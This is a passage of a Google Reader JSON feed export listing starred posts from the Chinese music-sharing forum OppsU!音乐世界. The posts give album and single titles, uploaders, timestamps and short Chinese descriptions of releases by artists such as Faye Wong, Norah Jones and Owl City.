    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291642992526",
    "timestampUsec" : "1291642992526121",
    "id" : "tag:google.com,2005:reader/item/fb9f2ac81c873602",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "王菲&lt;Eyes on Me (最终幻想8主题曲) &gt; [115]",
    "published" : 1291642992,
    "updated" : 1291642992,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45138.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面： \n \n专辑简介： \n名 称：Eyes On Me \n歌 手：王菲 \n语 言：国/英语专辑1CD \n公 司：EMI \n日 期：1999.02.24 \n\n　　日本的游戏公司史克威尔98年年度大作—FF8的主题曲，此前历代游戏开发的成功以及《最终幻想VII》以及《寄生前夜》等电影化作品的成功，为史克威尔奠定了坚实的技术和资金基础，在这款大做上人们基 .."
    },
    "author" : "uker",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291549496603",
    "timestampUsec" : "1291549496603799",
    "id" : "tag:google.com,2005:reader/item/26b3ac4ca6f5dcec",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Jessie J&lt;Do It Like A Dude - EP&gt;2011年最受期待的女声-已补档[115]",
    "published" : 1291549496,
    "updated" : 1291549496,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-44808.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面： \n \n\n曲目列表： \n \n\n简介： \nJessie J被认为2011年最受期待的女声之一。这位创作人之前曾经给Christina Aguilera写过歌，之前Miley的《Party in the USA》也是出自她的手笔。这首歌是她第一张专辑的首支单曲。12月7日在美国发售。有兴趣的同学可以去http://www.myspace.com/jessiejofficial试听她几首新歌，都 .."
    },
    "author" : "eyescream",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542559119",
    "timestampUsec" : "1291542559119706",
    "id" : "tag:google.com,2005:reader/item/e757e92c5c23efd0",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "徐若瑄 &lt;Love Vivian最爱是V新歌+精选&gt;艾回时期精选[115]",
    "published" : 1291542559,
    "updated" : 1291542559,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-39328.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "  \n\n由2003年起，徐若瑄由日本歌坛转战台湾，并与艾迴音乐合作共推了三张唱片。2007年新曲加合辑《Love Vivian最爱是V新歌+精选》则收录了 Vivian在多年来的精选歌20首歌曲和十首MV。双CD分为A盘和B盘，【烈爱红A盘】收录了10首舞曲，【纯爱白B 盘】收录了10首情歌，包括新歌「好眼泪坏眼泪」。而DVD收录了「Dr .."
    },
    "author" : "akoda",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542552207",
    "timestampUsec" : "1291542552207467",
    "id" : "tag:google.com,2005:reader/item/e6e0f44e5ff3f911",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "Olivia Ong &lt;Olivia Ong&gt; 第一张同名专辑 [115]",
    "published" : 1291542552,
    "updated" : 1291542552,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-40727.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "http://www.oppsu.cn/p_w_upload/Mon_1011/2_21364_bd429c3e3d7078a.jpg\n\nhttp://www.oppsu.cn/p_w_upload/Mon_1011/2_21364_673b43048f84e5f.jpg\n\n注意：苹果店里原来信息就是错的，artist 和 Album 名字都是Olvia Ong，我也没改动。\n非自购 网上转载 感谢原购买者\n下载地址："
    },
    "author" : "ntuyz",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542551000",
    "timestampUsec" : "1291542551000003",
    "id" : "tag:google.com,2005:reader/item/b074c6ce6b0ad1ca",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "谢安琪&lt;Kay One Plus&gt;免刀分享[DB]",
    "published" : 1291542551,
    "updated" : 1291542551,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-40853.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "下载地址："
    },
    "author" : "peter999",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542550750",
    "timestampUsec" : "1291542550750758",
    "id" : "tag:google.com,2005:reader/item/5605cc5e69bb8353",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "谢安琪&lt;二元&gt; 免刀分享 [DB]",
    "published" : 1291542550,
    "updated" : 1291542550,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-40863.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "下载地址："
    },
    "author" : "peter999",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542531809",
    "timestampUsec" : "1291542531809256",
    "id" : "tag:google.com,2005:reader/item/436982bc84d8a3e8",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "卓文萱&lt;习惯&gt;2006年10月27日发行 实力派偶像派小女人的声音[DB]",
    "published" : 1291542531,
    "updated" : 1291542531,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-42232.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑介绍：　\n         一种值得等待的好音乐 一种值得上瘾的好习惯 \n\n　　酝酿了那么久 20岁 清甜音频 1825日子里 学习 累积 成长 \n\n　　只为了品尝更甜美的果实 从现在开始让耳朵习惯 好声音 让我们习惯 \n\n　　习惯－卓文萱 \n\n　　2006超强偶像剧《恋爱女王》片头/片尾/插曲 \n .."
    },
    "author" : "woo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542523698",
    "timestampUsec" : "1291542523698530",
    "id" : "tag:google.com,2005:reader/item/194a844408893fb1",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "林志美&lt;完全精选3CD&gt; [115]",
    "published" : 1291542523,
    "updated" : 1291542523,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-42459.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "这张精选估计是林志美音质最好的版本了！ \n下载地址："
    },
    "author" : "peter999",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542514333",
    "timestampUsec" : "1291542514333589",
    "id" : "tag:google.com,2005:reader/item/7c36474ceb9a7d31",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "谢安琪&lt;第二个家&gt; 2010年首张国语大碟 [115]",
    "published" : 1291542514,
    "updated" : 1291542514,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-42539.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面： \n\n专辑曲目&amp;正版凭证： \n \n\n简介： \n   经过多方延揽曲目、邀词之后，这张由两岸三地各路音乐好手炮制的专辑终于完成。首波主打《脆弱》更是强势推出，谢安琪澎湃的感情、有力的唱腔，加上方大同拿手的soulful曲调，李焯雄深刻寂寥的笔触，融汇成这首唤醒心灵之作，也成为《第二个家》打开温暖人 .."
    },
    "author" : "zhu",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542482695",
    "timestampUsec" : "1291542482695278",
    "id" : "tag:google.com,2005:reader/item/b034331f16b21b16",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "贾立怡&lt;听听.爱&gt; [RF/ DB /115]",
    "published" : 1291542482,
    "updated" : 1291542482,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-43398.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面：\n \n专辑曲目：\n　　   \n专辑介绍：  \n\n　　一张用“爱”灌溉的专辑，与你分享爱的感动 \n　　继上张专辑《独奏》在台湾正式发行，并取得不错成绩。在之后的一年里，贾立怡去了美国游学, 师从Wendy老师学习声乐和作曲，Wendy老师也曾经是王力宏，Nicole Atkins, Regina Spektor等多位知 .."
    },
    "author" : "chou",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542458442",
    "timestampUsec" : "1291542458442698",
    "id" : "tag:google.com,2005:reader/item/9550b2642c7e3384",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "贾立怡&lt;感恩节&gt; [RF/ DB /115]",
    "published" : 1291542458,
    "updated" : 1291542458,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-43397.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面：\n\n专辑曲目：\n\n专辑介绍：\n\n⊙感恩是一种态度 每个暖过寒冷过的季节 都为了生命的歌谱写\n初听贾立怡这个名字是在去年，当时已经在珠江三角洲地区有了凡响，也几乎搜刮了那年南方地区所有的新人奖，所以记住了“贾立怡”。一年后的今天再次听到这个名字，听到这首《感恩节》，让我们对这个小小年纪、却拥有如此音 .."
    },
    "author" : "chou",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542451561",
    "timestampUsec" : "1291542451561822",
    "id" : "tag:google.com,2005:reader/item/a3aa6dadd20cf104",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "雷光夏&lt;黑暗之光&gt; 台湾才女论坛首发 [115]",
    "published" : 1291542451,
    "updated" : 1291542451,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-43642.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面及曲目： \n<a href=\"http://www.oppsu.cn/p_w_upload/photo/Mon_1011/333_b3251290908173a59da5bdeeecada.jpg\">http://www.oppsu.cn/p_w_upload/photo/Mon_1011/333_b3251290908173a59da5bdeeecada.jpg</a>\n背景简介：\n雷光夏，隐形气质才女，噪音民谣，诗人。交大传播科技研究所硕士班毕业。现任台北爱乐电台节目制作人、主持。\n配乐作品：“作家身影”纪录片(本片获88年金钟奖) “南国再见南国” “海上花”主题歌曲 .."
    },
    "author" : "511799414",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542445133",
    "timestampUsec" : "1291542445133166",
    "id" : "tag:google.com,2005:reader/item/ad95b865b3315b58",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "陶晶莹&lt;我变了&gt;1999年丰华出品[115]",
    "published" : 1291542445,
    "updated" : 1291542445,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-43748.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "唱片标题：陶晶莹&lt;我变了&gt;\n\n唱片正式封面：\n  \n唱片正式曲目及购买信息：\n    \n唱片简介：\n\n       全情投入“我变了”是陶晶莹离开飞碟后，99 年加盟丰华的首张专辑。专辑内的曲风多样，抒情、迷幻、Rap、Rock、Jazz…等不同类别，陶子在演绎上也有着同样多变的唱腔。这张 .."
    },
    "author" : "yumingf",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542431660",
    "timestampUsec" : "1291542431660072",
    "id" : "tag:google.com,2005:reader/item/d8626aa4656fe36b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "徐怀钰&lt;天使&gt;平民天后［115］",
    "published" : 1291542431,
    "updated" : 1291542431,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-44794.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑简介：\n\n音乐团队国际化 \n为让专辑《天使》更具国际观,在这次的制作物部分有许多制作上、编曲上的工程以及歌手的配唱都拉到韩国进行,希望藉由怀钰的演唱与音乐才能和韩国的音乐人产生一次漂亮的激荡。韩国的音乐是比较重视计算机科技与后期作业的,因此对于专辑中“音乐性”部分的助益相当大。 \n在配唱方面,制作人的要 .."
    },
    "author" : "sam1989",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542421452",
    "timestampUsec" : "1291542421452445",
    "id" : "tag:google.com,2005:reader/item/cc7f0efe0fb743d7",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Hit*轻音乐大碟" ],
    "title" : "Various Artists&lt;100 Best Piano Classic&gt;来自古典的天籁[115]",
    "published" : 1291542421,
    "updated" : 1291542421,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-37905.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面\n  \n\n专辑曲目: \nCD.1 \n\nChopin – Nocturne in C sharp minor Op.posth Mikhail Pletnev (4.20)\nLiszt – 12 Transcendental Studies La Campanella Andr? Watts (4.33)\nBeethoven – Piano Sonata No.14 in C sharp minor Op.14 No.2,?Moonlight?I : Adagio sostenuto Mikhail Pletnev (7.16)\nChopin – Etude  .."
    },
    "author" : "_寻觅_",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542373645",
    "timestampUsec" : "1291542373645568",
    "id" : "tag:google.com,2005:reader/item/da1ce569552489c7",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Lady GaGa &lt;Fashion,Big Girl Now&gt; 免刀分享 [115]",
    "published" : 1291542373,
    "updated" : 1291542373,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-38039.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "http://i1116.photobucket.com/albums/k571/wooi-leong52jolin/2-1.jpg \n\n\nhttp://i1116.photobucket.com/albums/k571/wooi-leong52jolin/4.jpg \n\n\n\n\n&#39;Fashion&#39; 这支歌曲是收录在&lt;confession of a Shopaholic&gt;原声带中, \n而&quot;Big Girl Now&quot;是收录在New Kids on the Block的专辑&lt;The Block&gt;中 .."
    },
    "author" : "林伟良",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542268691",
    "timestampUsec" : "1291542268691752",
    "id" : "tag:google.com,2005:reader/item/f830ce0a96aafeff",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Owl City&lt;Peppermint Winter - Single&gt;猫头鹰之城最新暖人动听单曲，经典重现，感动无以言表[DB]",
    "published" : 1291542268,
    "updated" : 1291542268,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-42939.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "  \n\n发片随语：\n      听到这首歌当年那些熟悉的温暖的感觉又回来了， Adam Young组建了Owl City，他也是这支流行电子乐队的唯一成员。你会惊叹于冰冷的键盘上怎能滑落如此圆润的音符，电子元素的巧妙运用使得他的音乐饱满而不失利落，跃动着生机盎然的温情。如同糖衣包裹的声线 .."
    },
    "author" : "phantomrider",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542241955",
    "timestampUsec" : "1291542241955001",
    "id" : "tag:google.com,2005:reader/item/f93229be7777b083",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "顺子 &lt;不再想念Stop Missing&gt; 个人推荐 很好听的一首歌[115]",
    "published" : 1291542241,
    "updated" : 1291542241,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-43490.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "顺子应该都很熟悉了吧\n最近发现这首歌挺好听的 于是买下 分享\n\n\n\n\n(本版为Oppsu专属 猎户座的旅行包购买的ITUNES正版AAC格式) \n\n特别声明: \n         本音乐由猎户座的旅行包自购于UK区Itunes，专属Opssu论坛 \n         可以转载， .."
    },
    "author" : "猎户座的旅行包",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291542181391",
    "timestampUsec" : "1291542181391107",
    "id" : "tag:google.com,2005:reader/item/53ba0f54b88a33cb",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Jordan Pruitt &lt;My Shoes - Single&gt; 迪斯尼小才女好听单曲 [DB]",
    "published" : 1291542181,
    "updated" : 1291542181,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-44904.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING:  OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to  be REPOSTED to other  forums and blogs ,  otherswise your ID &amp; IP will be blocked FOREVER!!! \n\n单曲封面  \n\n歌手简介 \n美国迪斯尼的流行女歌手，今年仅仅只有17岁，这是她2008年最新的 .."
    },
    "author" : "水果弟弟",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291541544502",
    "timestampUsec" : "1291541544502716",
    "id" : "tag:google.com,2005:reader/item/8b7eca1bafdc916e",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Norah Jones&lt;Come Away With Me (Deluxe Version)&gt;补档 [115]",
    "published" : 1291541544,
    "updated" : 1291541544,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-44517.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑介绍：\n在2002年，一个并不算很年轻的女歌手的处女作专辑，给整个美国歌坛，特别是爵士乐坛以强大的冲击，这就是Norah Jones和她的《Come Away With Me》。一时间随着销量的稳步增长，好评和质疑如潮水般涌来，如今在乐评家们的争议声中，《Come Away With Me》已经悄然在Billoard专辑榜上驻扎了66周，并且丝毫没有褪 .."
    },
    "author" : "农民工",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291441517472",
    "timestampUsec" : "1291441517472511",
    "id" : "tag:google.com,2005:reader/item/4ee71f02e91b2bd2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Cake&lt;Comfort Eagle&gt;nano6代广告歌[115]",
    "published" : 1291441517,
    "updated" : 1291441517,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-44550.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面\n  \n\n\n\n专辑曲目\n  \n\n\n\n1.Opera Singer\n2.Meanwhile, Rick James...\n3.Shadow Stabbing\n4.Short Skirt/Long Jacket\n5.Commissioning a Symphony In C\n6.Arco Arena (Instrumental)\n7.Comfort Eagle\n8.Long Line of Cars\n9.Love You Madly\n10.Pretty Pink Ribbon\n11.World of Two\n\n\n\n\n简介\n这是Cake在2001年推出的 .."
    },
    "author" : "sally_118",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541833690",
    "timestampUsec" : "1288541833690564",
    "id" : "tag:google.com,2005:reader/item/029fa4bd9f09cf70",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Hit*轻音乐大碟" ],
    "title" : "David Garrett&lt;David Garrett: Pure Classics&gt;纯净的古典补档免刀[115]",
    "published" : 1288541833,
    "updated" : 1288541833,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31979.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑英文名: David Garrett: Pure Classics \n专辑中文名: 纯净的古典 \n艺术家: David Garrett古典类型: 室内乐 \n版本:  \n发行时间: 2002年02月12日 \n地区: 德国 \n语言: 英语 \n\n简介：二十六岁技艺超凡的 David Garrett，既是音乐天才，亦是一位独立自主的音乐家。他在小小年纪已一鸣惊人，有一次无意中拿起他哥哥的小提琴 .."
    },
    "author" : "sudanguo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541831795",
    "timestampUsec" : "1288541831795730",
    "id" : "tag:google.com,2005:reader/item/08e89cb8f4bec759",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Hit*轻音乐大碟" ],
    "title" : "Various Artist &lt;Smooth Jazz Essentials&gt;温柔而舒缓地触摸你的神经[115]",
    "published" : 1288541831,
    "updated" : 1288541831,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31443.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面：\n \n\n专辑简介：\n在Smooth Jazz发展的早期阶段，唱片公司会定期发行一些采样来推荐自己公司的艺术家们，这种方法曾是一种非常好的营销手段。虽然这种做法现在不常见了，但是换成了以一些知名的曲目改变为Smooth Jazz再次发行，成了很热门的发行手段。同时也让Smooth Jazz具有浓厚的商业味道。\n\n这张精选集便是此 .."
    },
    "author" : "richardghu",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541816851",
    "timestampUsec" : "1288541816851501",
    "id" : "tag:google.com,2005:reader/item/df078f1a9760f4ca",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Hit*轻音乐大碟" ],
    "title" : "Cincinnati Pops Orchestra &amp; Erich Kunzel &lt;Round-Up “万宝路”&gt;[115]",
    "published" : 1288541816,
    "updated" : 1288541816,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32292.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "http://oi52.tinypic.com/5wf7dw.jpg\n\n\n\nhttp://oi53.tinypic.com/2ibycsj.jpg\n\n\n\n\n    发行于1986年的《Round-Up》，这张唱片至今仍被众多音乐爱好者视为“发烧极品”。这张唱片非但拥有极致爆棚的录音特效，而且全面体现出美国本土管弦作品的魅力。美利坚西部那粗旷而质朴的民风被完美的表现出来。 .."
    },
    "author" : "ki057109",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541814941",
    "timestampUsec" : "1288541814941184",
    "id" : "tag:google.com,2005:reader/item/8418fba1ee142c00",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Hit*轻音乐大碟" ],
    "title" : "班得瑞bandari&lt;The best of Meditation 3CD&gt;静思超赞精选??补档[115]",
    "published" : 1288541814,
    "updated" : 1288541814,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32882.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "前语：最为欣赏的轻音乐团，这张3CD精选绝对值得细细聆听，喜好轻音乐者，当收~\n\n\n \n\n\n\n\n \n\n\n\n\n洗澡在此：\n  \n\n\n资源来自互联网 ? 谢绝转载"
    },
    "author" : "esure",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541812721",
